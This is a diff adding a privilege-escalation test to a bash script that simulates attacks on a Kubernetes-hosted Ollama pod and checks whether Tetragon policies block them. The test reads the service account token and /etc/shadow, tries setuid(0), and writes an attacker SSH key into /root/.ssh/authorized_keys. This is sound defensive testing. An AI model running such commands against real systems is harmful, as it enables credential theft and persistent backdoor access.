@@ -233,6 +233,100 @@ attack_cross_namespace() {
 }
 
 # =============================================================================
+# Attack 7: Privilege Escalation (Tetragon-blockable)
+# =============================================================================
+# Simulates privilege escalation attempts that Tetragon TracingPolicies can
+# detect and block: sensitive file reads, privesc syscalls, and persistence
+# =============================================================================
+attack_privilege_escalation() {
+    echo ""
+    echo "============================================================="
+    log_attack "ATTACK 7: Privilege Escalation (Sensitive Files & Syscalls)"
+    echo "============================================================="
+    echo ""
+    log_info "Scenario: An attacker with code execution attempts to escalate"
+    log_info "privileges by reading secrets, using privesc syscalls, or"
+    log_info "establishing persistence."
+    echo ""
+
+    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
+
+    if [ -z "$OLLAMA_POD" ]; then
+        log_result "Ollama pod not found. Deploy the LLM stack first."
+        return 1
+    fi
+
+    # Attack 7a: Read Kubernetes Service Account Token
+    log_info "7a: Attempting to read Kubernetes service account token..."
+    echo ""
+    echo "Command: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50; then
+        echo "..."
+        echo ""
+        log_result "⚠️  VULNERABLE: Service account token read SUCCEEDED"
+        log_result "Attacker could use token to access Kubernetes API!"
+    else
+        echo ""
+        log_result "✅ BLOCKED: Token read was killed by Tetragon file policy"
+    fi
+
+    echo ""
+
+    # Attack 7b: Read /etc/shadow (credential harvesting)
+    log_info "7b: Attempting to read /etc/shadow..."
+    echo ""
+    echo "Command: cat /etc/shadow"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- cat /etc/shadow 2>/dev/null | head -3; then
+        echo ""
+        log_result "⚠️  VULNERABLE: /etc/shadow read SUCCEEDED"
+        log_result "Attacker could crack password hashes!"
+    else
+        echo ""
+        log_result "✅ BLOCKED: /etc/shadow read was blocked by Tetragon"
+    fi
+
+    echo ""
+
+    # Attack 7c: Attempt setuid syscall (privilege escalation)
+    log_info "7c: Attempting setuid syscall to escalate to root..."
+    echo ""
+    echo "Command: python3 -c 'import os; os.setuid(0); print(\"setuid succeeded\")'"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- python3 -c 'import os; os.setuid(0); print("setuid(0) succeeded - now root")' 2>/dev/null; then
+        echo ""
+        log_result "⚠️  VULNERABLE: setuid syscall SUCCEEDED"
+        log_result "Attacker could escalate privileges!"
+    else
+        echo ""
+        log_result "✅ BLOCKED: setuid syscall was killed by Tetragon"
+    fi
+
+    echo ""
+
+    # Attack 7d: Write SSH key for persistence
+    log_info "7d: Attempting to write SSH key for persistence..."
+    echo ""
+    echo "Command: echo 'ssh-rsa ATTACKER_KEY' >> /root/.ssh/authorized_keys"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/sh -c 'mkdir -p /root/.ssh && echo "ssh-rsa AAAA_ATTACKER_KEY attacker@evil" >> /root/.ssh/authorized_keys && echo "SSH key written"' 2>/dev/null; then
+        echo ""
+        log_result "⚠️  VULNERABLE: SSH key persistence SUCCEEDED"
+        log_result "Attacker has persistent backdoor access!"
+        # Clean up
+        kubectl -n llm-system exec "$OLLAMA_POD" -- rm -f /root/.ssh/authorized_keys 2>/dev/null || true
+    else
+        echo ""
+        log_result "✅ BLOCKED: Write to /root/.ssh was killed by Tetragon"
+    fi
+}
+
+# =============================================================================
 # Run All Attacks
 # =============================================================================
 run_all_attacks() {
@@ -247,6 +341,7 @@ run_all_attacks() {
     attack_dns_exfiltration
     attack_api_exposure
     attack_cross_namespace
+    attack_privilege_escalation
 
     echo ""
     echo "============================================================="
@@ -283,11 +378,14 @@ main() {
         cross)
             attack_cross_namespace
             ;;
+        privesc)
+            attack_privilege_escalation
+            ;;
         all)
             run_all_attacks
             ;;
         *)
-            echo "Usage: $0 [egress|shell|network|dns|api|cross|all]"
+            echo "Usage: $0 [egress|shell|network|dns|api|cross|privesc|all]"
             exit 1
             ;;
     esac
